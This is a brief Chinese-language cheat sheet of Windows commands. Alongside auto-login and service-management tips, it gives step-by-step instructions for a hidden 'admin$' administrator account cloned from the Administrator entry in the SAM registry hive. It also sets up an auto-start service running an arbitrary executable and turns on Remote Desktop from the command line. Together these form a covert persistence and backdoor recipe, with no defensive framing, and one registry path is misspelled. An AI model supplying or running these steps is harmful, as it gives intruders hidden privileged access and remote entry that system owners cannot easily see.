# Windows

### 自动登录设置

```angular2html
control userpasswords2

```

### Windows注册表添加账户

> 使用命令 `net user admin$ admin /add`添加账户
>
> 使用命令 `net localgroup administrators admin$ /add`添加进管理员组
>
> 使用命令 `regedit`打开注册表，跳转到 `HKEY_LOACL_MACHINE\SAM\SAM` 发现没有展开项，需要修改权限为 `当前用户-完全控制`
> 
> 然后将继续展开 `Domains\Account\Users` 找到添加的账户导出注册表，找到对应制的F替换成Administrator账户的F值，导出
>

### 创建服务
```angular2html
sc create 服务名称 start= auto binPath= "C:\haya.exe"
```
### 删除服务
````angular2html
sc delete 服务名称
````
### 命令行开启3389(远程桌面)
```angular2html
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```